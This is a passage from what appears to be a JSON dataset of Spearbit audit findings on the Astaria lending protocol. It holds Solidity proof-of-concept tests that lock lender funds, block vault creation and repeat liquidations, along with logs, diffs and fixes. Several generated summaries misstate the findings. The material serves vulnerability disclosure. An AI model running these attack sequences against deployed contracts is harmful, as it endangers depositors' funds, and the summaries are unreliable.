shareholders would not be able to exit their shares. All shares are locked unless the protocol admin pushes updates to the current implementation.\n\n## Test Case\nAdd the following test case to:\n- **File**: `src/test/LienTokenSettlementScenarioTest.t.sol`\n\nMake sure to also add the following import:\n```solidity\nimport { WithdrawProxy } from \"core/WithdrawProxy.sol\";\n```\n\n### Scenario 10: `commitToLien` -> `liquidate` with `WithdrawProxy` -> …\n\n```solidity\nfunction testScenario10() public {\n    TestNFT nft = new TestNFT(2);\n    address tokenContract = address(nft);\n    uint256 tokenIdOne = uint256(0);\n    uint256 tokenIdTwo = uint256(1);\n    // create a PublicVault with a 14-day epoch\n    address publicVault = _createPublicVault(\n        strategistOne,\n        strategistTwo,\n        14 days,\n        1e17\n    );\n    address lender = address(1);\n    vm.label(lender, \"lender\");\n    // lend 10 ether to the PublicVault as address(1)\n    _lendToVault(\n        Lender({ addr: lender, amountToLend: 10 ether }),\n        payable(publicVault)\n    );\n    address lender2 = address(2);\n    vm.label(lender2, \"lender\");\n    // lend 10 ether to the PublicVault as address(2)\n    _lendToVault(\n        Lender({ addr: lender2, amountToLend: 10 ether }),\n        payable(publicVault)\n    );\n    // skip 1 epoch\n    skip(14 days);\n    _signalWithdrawAtFutureEpoch(\n        lender,\n        payable(publicVault),\n        1 // epoch to redeem\n    );\n    {\n        console2.log(\"\\n--- process epoch ---\");\n        PublicVault(payable(publicVault)).processEpoch();\n        // current epoch should be 1\n        uint256 currentEpoch = PublicVault(payable(publicVault)).getCurrentEpoch();\n        emit log_named_uint(\"currentEpoch\", currentEpoch);\n        assertEq(currentEpoch, 1, \"The current epoch should be 1\");\n    }\n    skip(1 days);\n    // borrow 5 eth against the dummy NFT\n    (, ILienToken.Stack memory stackOne) = _commitToLien({\n        vault: payable(publicVault),\n        strategist: strategistOne,\n        strategistPK: strategistOnePK,\n        tokenContract: tokenContract,\n        tokenId: tokenIdOne,\n        lienDetails: ILienToken.Details({\n            maxAmount: 50 ether,\n            rate: (uint256(1e16) * 150) / (365 days),\n            duration: 11 days,\n            maxPotentialDebt: 0 ether,\n            liquidationInitialAsk: 100 ether\n        }),\n        amount: 5 ether\n    });\n    // skip 11 days\n    OrderParameters memory listedOrderOne = _liquidate(stackOne);\n    IWithdrawProxy withdrawProxy = PublicVault(payable(publicVault)).getWithdrawProxy(1);\n    {\n        (\n            uint256 withdrawRatio,\n            uint256 expected,\n            uint40 finalAuctionEnd,\n            uint256 withdrawReserveReceived\n        ) = withdrawProxy.getState();\n        emit log_named_uint(\"finalAuctionEnd @ e_1\", finalAuctionEnd);\n    }\n    {\n        skip(2 days);\n        console2.log(\"\\n--- process epoch ---\");\n        PublicVault(payable(publicVault)).processEpoch();\n        // current epoch should be 2\n        uint256 currentEpoch = PublicVault(payable(publicVault)).getCurrentEpoch();\n        emit log_named_uint(\"currentEpoch\", currentEpoch);\n        assertEq(currentEpoch, 2, \"The current epoch should be 2\");\n    }\n    {\n        (\n            uint256 withdrawRatio,\n            uint256 expected,\n            uint40 finalAuctionEnd,\n            uint256 withdrawReserveReceived\n        ) = withdrawProxy.getState();\n        uint256 withdrawReserve = PublicVault(payable(publicVault)).getWithdrawReserve();\n        emit log_named_uint(\"finalAuctionEnd @ e_1\", finalAuctionEnd);\n        emit log_named_uint(\"withdrawReserve\", withdrawReserve);\n    }\n    {\n        PublicVault(payable(publicVault)).transferWithdrawReserve();\n        uint256 withdrawReserve = PublicVault(payable(publicVault)).getWithdrawReserve();\n        emit log_named_uint(\"withdrawReserve\", withdrawReserve);\n    }\n    {\n        // allow flash liens - liens that can be liquidated in the same block that was committed\n        IAstariaRouter.File[] memory files = new IAstariaRouter.File[](1);\n        files[0] = IAstariaRouter.File(\n            IAstariaRouter.FileType.MinLoanDuration,\n            abi.encode(uint256(0))\n        );\n        ASTARIA_ROUTER.fileBatch(files);\n    }\n    // borrow 5 eth against the dummy NFT\n    (, ILienToken.Stack memory stackTwo) = _commitToLien({\n        vault: payable(publicVault),\n        strategist: strategistOne,\n        strategistPK: strategistOnePK,\n        tokenContract: tokenContract,\n        tokenId: tokenIdTwo,\n        lienDetails: ILienToken.Details({\n            maxAmount: 50 ether,\n            rate: (uint256(1e16) * 150) / (365 days),\n            duration: 0 seconds,\n            maxPotentialDebt: 0 ether,\n            liquidationInitialAsk: 1 wei\n        }),\n        amount: 1 wei\n    });\n    {\n        skip(14 days);\n        console2.log(\"\\n--- process epoch ---\");\n        PublicVault(payable(publicVault)).processEpoch();\n        // current epoch should be 3\n        uint256 currentEpoch = PublicVault(payable(publicVault)).getCurrentEpoch();\n        emit log_named_uint(\"currentEpoch\", currentEpoch);\n        assertEq(currentEpoch, 3, \"The current epoch should be 3\");\n        (\n            uint256 withdrawRatio,\n            uint256 expected,\n            uint40 finalAuctionEnd,\n            uint256 withdrawReserveReceived\n        ) = withdrawProxy.getState();\n        // finalAuctionEnd will be non-zero\n        emit log_named_uint(\"finalAuctionEnd @ e_1\", finalAuctionEnd);\n    }\n    console2.log(\"\\n--- liquidate the flash lien corresponding to epoch 1 ---\");\n    OrderParameters memory listedOrderTwo = _liquidate(stackTwo);\n    {\n        (\n            uint256 withdrawRatio,\n            uint256 expected,\n            uint40 finalAuctionEnd,\n            uint256 withdrawReserveReceived\n        ) = withdrawProxy.getState();\n        // finalAuctionEnd will be non-zero\n        emit log_named_uint(\"finalAuctionEnd @ e_1\", finalAuctionEnd);\n    }\n    // at this point `claim() `cannot be called for `withdrawProxy `since\n    // the current epoch does not equal to `2`which is the CLAIMABLE_EPOCH()\n    // for this withdraw proxy. and in fact it will never be since its current value\n    // is `3`and its value never decreases. This means `finalAuctionEnd `will never\n    // be reset to `0`and so `redeem `and `withdraw `endpoints cannot be called\n    // and the lender funds are locked in `withdrawProxy `.\n    {\n        uint256 lenderShares = withdrawProxy.balanceOf(lender);\n        vm.expectRevert(\n            abi.encodeWithSelector(WithdrawProxy.InvalidState.selector,\n            WithdrawProxy.InvalidStates.NOT_CLAIMED)\n        );\n        uint256 redeemedAssets = withdrawProxy.redeem(lenderShares, lender, lender);\n    }\n}\n```",
      "summary": "\nThis bug report describes a high risk issue in WithdrawProxy.sol, PublicVault.sol, and related contracts. If flash liens are allowed by a public vault, an attacker can call lockup the to be redeemed funds of a WithdrawProxy by sandwiching a call to processEpoch(). The attack involves opening a lien and getting liquidated during one epoch, then opening a new lien for 1 wei with 0 duration and instantly processing the next epoch. This causes the claim() endpoint to be called on W to reset finalAuctionEnd to 0, and the current epoch would be e3. The attacker then back-runs and instantly liquidates the lien created to set W's finalAuctionEnd to a non-zero value again. Since the redeem and withdraw endpoints of the WithdrawProxy are guarded by the onlyWhenNoActiveAuction() modifier, the W shareholders would not be able to exit their shares, meaning all shares are locked unless the protocol admin pushes updates to the current implementation. A test case is suggested to be added to LienTokenSettlementScenarioTest.t.sol to prevent this issue.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Astaria",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Astaria-Spearbit-Security-Review-July.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Saw-Mon and Natalie",
        "Jonah1005",
        "Blockdev"
      ]
    },
    {
      "id": "21837",
      "title": "Vault creation can be DoSed by lien owners who can transfer their lien token to any address",
      "impact": "HIGH",
      "content": "## Severity: High Risk\n\n## Context:\n- AstariaRouter.sol#L778-L792\n- AstariaRouter.sol#L794-L796\n- Vault.sol#L53-L58\n\n## Description:\nWhen a vault is created, AstariaRouter uses the `Create2ClonesWithImmutableArgs` library to create a clone with immutable arguments:\n\n```solidity\nvaultAddr = Create2ClonesWithImmutableArgs.clone(\n    s.BEACON_PROXY_IMPLEMENTATION,\n    abi.encodePacked(\n        address(this),\n        vaultType,\n        msg.sender,\n        params.underlying,\n        block.timestamp,\n        params.epochLength,\n        params.vaultFee,\n        address(s.WETH)\n    ),\n    keccak256(abi.encodePacked(msg.sender, blockhash(block.number - 1)))\n);\n```\n\nOne caveat of this creation decision is that the to-be-deployed vault address can be derived beforehand. Right after the creation of the vault, AstariaRouter checks whether the created vault owns any liens, and if it does, it would revert:\n\n```solidity\nif (s.LIEN_TOKEN.balanceOf(vaultAddr) > 0) {\n    revert InvalidVaultState(IAstariaRouter.VaultState.CORRUPTED);\n}\n```\n\nWhen liens are committed to, if the lien was taken from a private vault, the private vault upon receiving the lien transfers the minted lien to the owner of the private vault:\n\n```solidity\nERC721(msg.sender).safeTransferFrom(\n    address(this),\n    owner(),\n    tokenId,\n    data\n);\n```\n\nCombining all these facts, a private vault's owner or any lien owners who can transfer their lien token to any address can DoS the vault creation process using the steps below:\n\n1. Create a private vault (if already owning a lien, jump to step 4).\n2. Deposit 1 wei into the private vault.\n3. Commit to a lien 1 wei from the private vault.\n4. The owner of the private vault front-runs, computes the to-be-deployed vault address, and transfers its lien token to this address.\n5. The vault creation process fails with `InvalidVaultState(IAstariaRouter.VaultState.CORRUPTED)`.\n\nThe cost of this attack would be 1 wei plus the associated gas fees.\n\n## Test Case\nAdd the following test case to the file: `src/test/LienTokenSettlementScenarioTest.t.sol`\n\n### Scenario 11: commitToLien -> send lien to a to-be-deployed vault\n\n```solidity\nfunction testScenario11() public {\n    uint256 attackerPK = uint256(0xa77ac3);\n    address attacker = vm.addr(attackerPK);\n    vm.label(attacker, \"attacker\");\n    uint256 lienId;\n    {\n        TestNFT nft = new TestNFT(1);\n        address tokenContract = address(nft);\n        uint256 tokenId = uint256(0);\n        address privateVault = _createPrivateVault(attacker, attacker);\n        vm.label(privateVault, \"privateVault\");\n        console2.log(\"[+] private vault is created: %s\", privateVault);\n        // lend 1 wei to the privateVault\n        _lendToPrivateVault(\n            PrivateLender({addr: attacker, amountToLend: 1 wei, token: address(WETH9)}),\n            payable(privateVault)\n        );\n        console2.log(\"[+] lent 1 wei to the private vault.\");\n        // borrow 1 wei against the dummy NFT\n        (lienId, ) = _commitToLien({\n            vault: payable(privateVault),\n            strategist: attacker,\n            strategistPK: attackerPK,\n            tokenContract: tokenContract,\n            tokenId: tokenId,\n            lienDetails: ILienToken.Details({\n                maxAmount: 1 wei,\n                rate: 1,\n                duration: 1 hours,\n                maxPotentialDebt: 0 ether,\n                liquidationInitialAsk: 1 ether\n            }),\n            amount: 1 wei,\n            revertMessage: \"\"\n        });\n        console2.log(\"[+] borrowed 1 wei against the private vault.\");\n        console2.log(\" lienId: %s\", lienId);\n        console2.log(\" owner of lienId: %s\", LIEN_TOKEN.ownerOf(lienId));\n        assertEq(\n            LIEN_TOKEN.ownerOf(lienId),\n            attacker,\n            \"attacker should be the owner of the lienId.\"\n        );\n    }\n    address strategist = address(1);\n    uint256 epochLength = 14 days;\n    uint256 vaultFee = 1e17;\n    {\n        console2.log(\"[+] calculate the to-be-deployed public vault address.\");\n        bytes memory immutableData = abi.encodePacked(\n            address(ASTARIA_ROUTER),\n            uint8(1), // uint8(ImplementationType.PublicVault)\n            strategist,\n            address(WETH9),\n            block.timestamp,\n            epochLength,\n            vaultFee,\n            address(WETH9)\n        );\n        bytes32 salt = keccak256(abi.encodePacked(strategist, blockhash(block.number - 1)));\n        address toBeDeployedPublicvault = Create2ClonesWithImmutableArgs.deriveAddress(\n            address(ASTARIA_ROUTER),\n            ASTARIA_ROUTER.BEACON_PROXY_IMPLEMENTATION(),\n            immutableData,\n            salt\n        );\n        console2.log(\" toBeDeployedPublicvault address: %s\", toBeDeployedPublicvault);\n        vm.startPrank(attacker);\n        LIEN_TOKEN.transferFrom(attacker, toBeDeployedPublicvault, lienId);\n        vm.stopPrank();\n        console2.log(\"[+] lien transferred to the toBeDeployedPublicvault.\");\n        assertEq(\n            LIEN_TOKEN.ownerOf(lienId),\n            toBeDeployedPublicvault,\n            \"The owner of the lienId should be the toBeDeployedPublicvault.\"\n        );\n        assertEq(\n            LIEN_TOKEN.balanceOf(toBeDeployedPublicvault),\n            1,\n            \"The lien balance of toBeDeployedPublicvault should be 1.\"\n        );\n    }\n    // create a PublicVault\n    vm.startPrank(strategist);\n    vm.expectRevert(\n        abi.encodeWithSelector(\n            IAstariaRouter.InvalidVaultState.selector,\n            IAstariaRouter.VaultState.CORRUPTED\n        )\n    );\n    address publicVault = payable(\n        ASTARIA_ROUTER.newPublicVault(\n            epochLength, // epoch length in [7, 45] days\n            strategist,\n            address(WETH9),\n            vaultFee, // not greater than 5e17\n            false,\n            new address[](0),\n            uint256(0)\n        )\n    );\n    vm.stopPrank();\n    console2.log(\"[+] Public vault creation fails with InvalidVaultState(VaultState.CORRUPTED).\");\n}\n```\n\n### Logs:\n```\n[+] private vault is created: 0x7BF14E2ad40df80677D356099565a08011B72d66\n[+] lent 1 wei to the private vault.\n[+] borrowed 1 wei against the private vault.\nlienId: 78113226609386929237635937490344951966356214732432064308195118046023211325984\nowner of lienId: 0x60873Bc6F2C9333b465F60e461cf548EfFc7E6EA\n[+] calculate the to-be-deployed public vault address.\ntoBeDeployedPublicvault address: 0xe9B9495b2A6b71A871b981A5Effa56575f872A31\n[+] lien transferred to the toBeDeployedPublicvault.\n[+] Public vault creation fails with InvalidVaultState(VaultState.CORRUPTED).\n```\n\nThis issue was introduced in commit `04c6ea`.\n\n### Diff:\n```diff\ndiff --git a/src/AstariaRouter.sol b/src/AstariaRouter.sol\nindex cfa76f1..bd18a84 100644\n--- a/src/AstariaRouter.sol\n+++ b/src/AstariaRouter.sol\n@@ -20,10 +20,9 @@ import {SafeTransferLib} from \"solmate/utils/SafeTransferLib.sol\";\n import {ERC721} from \"solmate/tokens/ERC721.sol\";\n import {ITransferProxy} from \"core/interfaces/ITransferProxy.sol\";\n import {SafeCastLib} from \"gpl/utils/SafeCastLib.sol\";\n-\n import {\n- ClonesWithImmutableArgs\n-} from \"clones-with-immutable-args/ClonesWithImmutableArgs.sol\";\n+ Create2ClonesWithImmutableArgs\n+} from \"create2-clones-with-immutable-args/Create2ClonesWithImmutableArgs.sol\";\n import {CollateralLookup} from \"core/libraries/CollateralLookup.sol\";\n@@ -721,7 +720,7 @@ contract AstariaRouter is\n }\n//immutable data\n- vaultAddr = ClonesWithImmutableArgs.clone(\n+ vaultAddr = Create2ClonesWithImmutableArgs.clone(\n    s.BEACON_PROXY_IMPLEMENTATION,\n    abi.encodePacked(\n        address(this),\n@@ -731,9 +730,13 @@ contract AstariaRouter is\n        block.timestamp,\n        epochLength,\n        vaultFee\n- )\n+ ),\n+ keccak256(abi.encode(msg.sender, blockhash(block.number - 1)))\n);\n+ if (s.LIEN_TOKEN.balanceOf(vaultAddr) > 0) {\n+ revert InvalidVaultState(IAstariaRouter.VaultState.CORRUPTED);\n+ }\n//mutable data\n IVaultImplementation(vaultAddr).init(\n    IVaultImplementation.InitParams({\n```\n\n## Additional Findings:\n- To address two of the findings from the Code4rena audit:\n  - [Finding 1](https://code423n4.com/2023-01-astaria-findings/issues/246)\n  - [Finding 2](https://code423n4.com/2023-01-astaria-findings/issues/571)",
      "summary": "\nThis bug report is about a Denial of Service (DoS) attack on the AstariaRouter.sol and Vault.sol smart contracts. When a vault is created, the Create2ClonesWithImmutableArgs library is used to create a clone with immutable arguments. This allows the to-be-deployed vault address to be derived beforehand. After the vault is created, AstariaRouter checks whether the created vault owns any liens and if it does, it would revert. If a lien is taken from a private vault, the private vault upon receiving the lien transfers the minted lien to the owner of the private vault. This allows the private vault's owner or any lien owners who can transfer their lien token to any address to DoS the vault creation process. The steps to do this are: creating a private vault, depositing 1 wei into the private vault, committing to a lien 1 wei from the private vault, the owner of the private vault front-runs and computes the to be deployed vault address and transfers its lien token to this address, and the vault creation process fails with InvalidVaultState(IAstariaRouter.VaultState.CORRUPTED). The cost of this attack would be 1 wei plus the associated gas fees. This issue was introduced in commit 04c6ea and the solution is to add a test case to the file src/test/LienTokenSettlementScenarioTest.t.sol. This bug report is related to two findings from the Code4rena audit.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Astaria",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Astaria-Spearbit-Security-Review-July.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Saw-Mon and Natalie",
        "Jonah1005",
        "Blockdev"
      ]
    },
    {
      "id": "21836",
      "title": "When a vault is shutdown a user can still commit to liens using the vault",
      "impact": "HIGH",
      "content": "## Vulnerability Report\n\n## Severity: High Risk\n\n### Context\n- `AstariaRouter.sol#L864-L872`\n- `VaultImplementation.sol#L142-L151`\n- `VaultImplementation.sol#L61-L77`\n- `VaultImplementation.sol#L153-L155`\n\n### Description\nWhen a vault is shut down, one should not be able to take more liens using the funds from this vault. In the commit to lien flow, `AstariaRouter` fetches the state of the vault:\n\n```solidity\n(\n,\naddress delegate,\naddress owner,\n,\n,// s.isShutdown\nuint256 nonce,\nbytes32 domainSeparator\n) = IVaultImplementation(c.lienRequest.strategy.vault).getState();\n```\n\nBut does not use the `s.isShutdown` flag to stop the flow if it is set to true.\n\nWhen a vault is shut down, we should have:\n- vault endpoint reverts should revert\n- deposit: YES\n- mint: YES\n- redeem: NO\n- withdraw: NO\n- redeemFutureEpoch: NO\n- payment flows: NO\n- liquidation flows: NO\n- commitToLien: YES\n\n### Test Case\nAdd this test case to the following file:\n- `src/test/LienTokenSettlementScenarioTest.t.sol`\n\n#### Scenario 12: `create vault > shutdown > commitToLien`\n\n```solidity\nfunction testScenario12() public {\n    console2.log(\"--- test private vault shutdown ---\");\n    uint256 ownerPK = uint256(0xa77ac3);\n    address owner = vm.addr(ownerPK);\n    vm.label(owner, \"owner\");\n    uint256 lienId;\n    TestNFT nft = new TestNFT(1);\n    address tokenContract = address(nft);\n    uint256 tokenId = uint256(0);\n    address privateVault = _createPrivateVault(owner, owner);\n    vm.label(privateVault, \"privateVault\");\n    console2.log(\"[+] private vault is created: %s\", privateVault);\n    \n    // Lend 1 wei to the privateVault\n    _lendToPrivateVault(\n        PrivateLender({addr: owner, amountToLend: 1 wei, token: address(WETH9)}),\n        payable(privateVault)\n    );\n    console2.log(\"[+] lent 1 wei to the private vault.\");\n    console2.log(\"[+] shudown private vault.\");\n    \n    vm.startPrank(owner);\n    Vault(payable(privateVault)).shutdown();\n    vm.stopPrank();\n    \n    assertEq(\n        Vault(payable(privateVault)).getShutdown(),\n        true,\n        \"Private Vault should be shutdown.\"\n    );\n\n    // Borrow 1 wei against the dummy NFT\n    (lienId, ) = _commitToLien({\n        vault: payable(privateVault),\n        strategist: owner,\n        strategistPK: ownerPK,\n        tokenContract: tokenContract,\n        tokenId: tokenId,\n        lienDetails: ILienToken.Details({\n            maxAmount: 1 wei,\n            rate: 1,\n            duration: 1 hours,\n            maxPotentialDebt: 0 ether,\n            liquidationInitialAsk: 1 ether\n        }),\n        amount: 1 wei,\n        revertMessage: \"\"\n    });\n    console2.log(\"[+] borrowed 1 wei against the private vault.\");\n    console2.log(\" lienId: %s\", lienId);\n    console2.log(\" owner of lienId: %s\\n\\n\", LIEN_TOKEN.ownerOf(lienId));\n\n    assertEq(\n        LIEN_TOKEN.ownerOf(lienId),\n        owner,\n        \"owner should be the owner of the lienId.\"\n    );\n    \n    console2.log(\"--- test public vault shutdown ---\");\n    uint256 ownerPK2 = uint256(0xa77ac322);\n    address owner2 = vm.addr(ownerPK2);\n    vm.label(owner2, \"owner\");\n    uint256 lienId2;\n    TestNFT nft2 = new TestNFT(1);\n    address tokenContract2 = address(nft2);\n    uint256 tokenId2 = uint256(0);\n    address publicVault = _createPublicVault(owner2, owner2, 14 days);\n    vm.label(publicVault, \"publicVault\");\n    console2.log(\"[+] public vault is created: %s\", publicVault);\n    \n    // Lend 1 wei to the publicVault\n    _lendToVault(\n        Lender({addr: owner2, amountToLend: 1 ether}),\n        payable(publicVault)\n    );\n    console2.log(\"[+] lent 1 ether to the public vault.\");\n    console2.log(\"[+] shudown public vault.\");\n    \n    vm.startPrank(owner2);\n    Vault(payable(publicVault)).shutdown();\n    vm.stopPrank();\n    \n    assertEq(\n        Vault(payable(publicVault)).getShutdown(),\n        true,\n        \"Public Vault should be shutdown.\"\n    );\n\n    // Borrow 1 wei against the dummy NFT\n    (lienId2, ) = _commitToLien({\n        vault: payable(publicVault),\n        strategist: owner2,\n        strategistPK: ownerPK2,\n        tokenContract: tokenContract2,\n        tokenId: tokenId2,\n        lienDetails: ILienToken.Details({\n            maxAmount: 1 wei,\n            rate: 1,\n            duration: 1 hours,\n            maxPotentialDebt: 0 ether,\n            liquidationInitialAsk: 1 ether\n        }),\n        amount: 1 wei,\n        revertMessage: \"\"\n    });\n    console2.log(\"[+] borrowed 1 wei against the public vault.\");\n    console2.log(\" lienId: %s\", lienId2);\n    console2.log(\" owner of lienId: %s\", LIEN_TOKEN.ownerOf(lienId2));\n    \n    assertEq(\n        LIEN_TOKEN.ownerOf(lienId2),\n        publicVault,\n        \"Public vault should be the owner of the lienId.\"\n    );\n}\n```\n\n### Test Output\n```\nforge t --mt testScenario12 --ffi -vvv :\n--- test private vault shutdown ---\n[+] private vault is created: 0x7BF14E2ad40df80677D356099565a08011B72d66\n[+] lent 1 wei to the private vault.\n[+] shudown private vault.\n[+] borrowed 1 wei against the private vault.\nlienId: 78113226609386929237635937490344951966356214732432064308195118046023211325984\nowner of lienId: 0x60873Bc6F2C9333b465F60e461cf548EfFc7E6EA\n--- test public vault shutdown ---\n[+] public vault is created: 0x5b1A54d097AA8Ce673b6816577752F6dfc10Ddd6\n[+] lent 1 ether to the public vault.\n[+] shudown public vault.\n[+] borrowed 1 wei against the public vault.\nlienId: 13217102800774263219074199159187108198090219420208960450275388834853683629020\nowner of lienId: 0x5b1A54d097AA8Ce673b6816577752F6dfc10Ddd6\n```\n\n### Recommendation\nIn `executeCommitment(...)`, use the `isShutdown` flag to revert committing to a vault that has been shut down.\n\n### Status\n- **Astaria:** Fixed in PR 335.\n- **Spearbit:** Fixed.",
      "summary": "\nThis bug report is about an issue with the AstariaRouter and VaultImplementation contracts. When a vault is shutdown, it should not be possible to take more liens using the funds from this vault. The bug is that the AstariaRouter fetches the state of the vault, but does not use the s.isShutdown flag to stop the flow if it is set to true. This means that when a vault is shutdown, it is still possible to take more liens using the funds from this vault.\n\nThe expected behaviour is that when a vault is shutdown, the following should happen: vault endpoint reverts should revert, deposits should be allowed, minting should be allowed, redeeming should be disallowed, withdrawing should be disallowed, redeeming future epochs should be disallowed, payment flows should be disallowed, liquidation flows should be disallowed and committing to liens should be allowed.\n\nThe recommendation to fix this bug is to use the isShutdown flag in the executeCommitment function to revert committing to a vault that has been shutdown. Astaria has already fixed this bug in PR 335 and Spearbit has also fixed it.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Astaria",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Astaria-Spearbit-Security-Review-July.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Saw-Mon and Natalie",
        "Jonah1005",
        "Blockdev"
      ]
    },
    {
      "id": "21835",
      "title": "maxStrategistFee is incorrectly set in AstariaRouter 's constructor",
      "impact": "HIGH",
      "content": "## Severity: High Risk\n\n## Context\n- AstariaRouter.sol#L111\n- AstariaRouter.sol#L325-L329\n- PublicVault.sol#L637-L641\n\n## Description\nIn `AstariaRouter`'s constructor, we set the `maxStrategistFee` as:\n\n```solidity\ns.maxStrategistFee = uint256(50e17); // 5e18\n```\n\nBut in the filing route, we check that this value should not be greater than `1e18`. `maxStrategistFee` is supposed to set an upper bound for the public vault's strategist vault fee. When a payment is made for a lien, one calculates the shares to be minted for the strategist based on this value and the interest amount paid:\n\n```solidity\nfunction _handleStrategistInterestReward(\n    VaultData storage s,\n    uint256 interestPaid\n) internal virtual {\n    if (VAULT_FEE() != uint256(0) && interestPaid > 0) {\n        uint256 fee = interestPaid.mulWadDown(VAULT_FEE());\n        uint256 feeInShares = convertToShares(fee);\n        _mint(owner(), feeInShares);\n    }\n}\n```\n\nNote that we are using `mulWadDown(...)` here:\n- \\( F = \\frac{f \\times I}{10^{18}} \\)\n\n### Parameter Description\n- **F**: fee\n- **f**: VAULT_FEE()\n- **I**: interestPaid\n\nSo, we would want \\( f \\leq 10^{18} \\). Currently, a vault could charge 5 times the interest paid.\n\n## Recommendation\nPerhaps `s.maxStrategistFee` needed to be set as \\( 0.5 \\times 10^{18} \\) and not \\( 5 \\times 10^{18} \\):\n\n```solidity\ns.maxStrategistFee = uint256(5e17); // 0.5 x 1e18, maximum 50%\n```\n\n## Astaria\nFixed in PR 336.\n\n## Spearbit\nFixed.",
      "summary": "\nThis bug report is about the AstariaRouter and PublicVault smart contracts. In the AstariaRouter's constructor, the maxStrategistFee was set as 5e18, however, in the filing route, the value should not exceed 1e18. The maxStrategistFee is used to set an upper bound for the public vault's strategist vault fee. When a payment is made for a lien, the shares to be minted for the strategist are calculated using this value and the interest amount paid. The problem was that the fee was calculated using mulWadDown(...) which would result in a fee of 5 times the interest paid. The recommendation was to set the maxStrategistFee as 0.5 x 1e18, which is the maximum fee of 50%. Astaria and Spearbit have both fixed the issue in their respective Pull Requests.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Astaria",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Astaria-Spearbit-Security-Review-July.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Saw-Mon and Natalie",
        "Jonah1005",
        "Blockdev"
      ]
    },
    {
      "id": "21834",
      "title": "AstariaRouter.liquidate(...) can be called multiple times for an expired lien/stack",
      "impact": "HIGH",
      "content": "## Severity: Critical Risk\n\n## Context:\n- AstariaRouter.sol#L681\n- CollateralToken.sol#L530-L532\n- LienToken.sol#L171-L174\n- PublicVault.sol#L656-L661\n- PublicVault.sol#L655\n\n## Description:\nThe current implementation of the protocol does not have any safeguard around calling `AstariaRouter.liquidate(...)` only once for an expired stack/lien. Thus, when a lien expires, multiple adversaries can override many different parameters by calling this endpoint at will in the same block or different blocks until one of the created auctions settles (which might not, as one can keep stacking these auctions with some delays to have a never-ending liquidation flow).\n\nHere is the list of storage parameters that can be manipulated:\n- `s.collateralLiquidator[stack.lien.collateralId].amountOwed` in `LienToken`: it is possible to keep increasing this value if we stack calls to `liquidate(...)` with delays.\n- `s.collateralLiquidator[stack.lien.collateralId].liquidator` in `LienToken`: This can be overwritten and would hold the last liquidator's address. Only this liquidator can claim the NFT if the corresponding auction does not settle, and they would also receive the liquidation fees.\n- `s.idToUnderlying[params.collateralId].auctionHash` in `CollateralToken`: would hold the last created auction's order hash for the same expired lien backed by the same collateral.\n- `slope` in `PublicVault`: If the lien is taken from a public vault, each call to `liquidate(...)` would reduce this value. So we can make this slope really small.\n- `s.epochData[epoch].liensOpenForEpoch` in `PublicVault`: If the lien is taken from a public vault, each call to `liquidate(...)` would reduce this value. This can result in a slope of 0 depending on the rate of this lien and the slope of the vault due to arithmetic underflows.\n- `yIntercept` in `PublicVault`: By mixing the manipulation of the vault's slope and stacking the calls to `liquidate(...)` with delays, we can also manipulate `yIntercept`.\n\n## Test Case\nAdd the following test case to:\n- **File**: `src/test/LienTokenSettlementScenarioTest.t.sol`\n\n```solidity\nfunction testScenario8() public {\n    TestNFT nft = new TestNFT(2);\n    address tokenContract = address(nft);\n    uint256 tokenIdOne = uint256(0);\n    uint256 tokenIdTwo = uint256(1);\n    uint256 initialBalance = WETH9.balanceOf(address(this));\n    \n    // Create a PublicVault with a 14-day epoch\n    address publicVault = _createPublicVault(\n        strategistOne,\n        strategistTwo,\n        14 days,\n        1e17\n    );\n    \n    // Lend 20 ether to the PublicVault as address(1)\n    _lendToVault(\n        Lender({addr: address(1), amountToLend: 20 ether}),\n        payable(publicVault)\n    );\n    \n    uint256 vaultShares = PublicVault(payable(publicVault)).totalSupply();\n    \n    // Borrow 10 eth against the dummy NFT with tokenId 0\n    (, ILienToken.Stack memory stackOne) = _commitToLien({\n        vault: payable(publicVault),\n        strategist: strategistOne,\n        strategistPK: strategistOnePK,\n        tokenContract: tokenContract,\n        tokenId: tokenIdOne,\n        lienDetails: ILienToken.Details({\n            maxAmount: 50 ether,\n            rate: (uint256(1e16) * 150) / (365 days),\n            duration: 10 days,\n            maxPotentialDebt: 0 ether,\n            liquidationInitialAsk: 100 ether\n        }),\n        amount: 10 ether\n    });\n    \n    // Borrow 10 eth against the dummy NFT with tokenId 1\n    (, ILienToken.Stack memory stackTwo) = _commitToLien({\n        vault: payable(publicVault),\n        strategist: strategistOne,\n        strategistPK: strategistOnePK,\n        tokenContract: tokenContract,\n        tokenId: tokenIdTwo,\n        lienDetails: ILienToken.Details({\n            maxAmount: 50 ether,\n            rate: (uint256(1e16) * 150) / (365 days),\n            duration: 10 days,\n            maxPotentialDebt: 0 ether,\n            liquidationInitialAsk: 100 ether\n        }),\n        amount: 10 ether\n    });\n    \n    uint256 collateralIdOne = tokenContract.computeId(tokenIdOne);\n    uint256 collateralIdTwo = tokenContract.computeId(tokenIdTwo);\n    \n    // Verify the strategist has no shares minted\n    assertEq(\n        PublicVault(payable(publicVault)).balanceOf(strategistOne),\n        0,\n        \"Strategist has incorrect share balance\"\n    );\n    \n    // Verify that the borrower has the CollateralTokens\n    assertEq(\n        COLLATERAL_TOKEN.ownerOf(collateralIdOne),\n        address(this),\n        \"CollateralToken not minted to borrower\"\n    );\n    assertEq(\n        COLLATERAL_TOKEN.ownerOf(collateralIdTwo),\n        address(this),\n        \"CollateralToken not minted to borrower\"\n    );\n    \n    // Fast forward to the end of lien one\n    vm.warp(block.timestamp + 10 days);\n    \n    address liquidatorOne = vm.addr(0x1195da7051);\n    address liquidatorTwo = vm.addr(0x1195da7052);\n    vm.label(liquidatorOne, \"liquidator 1\");\n    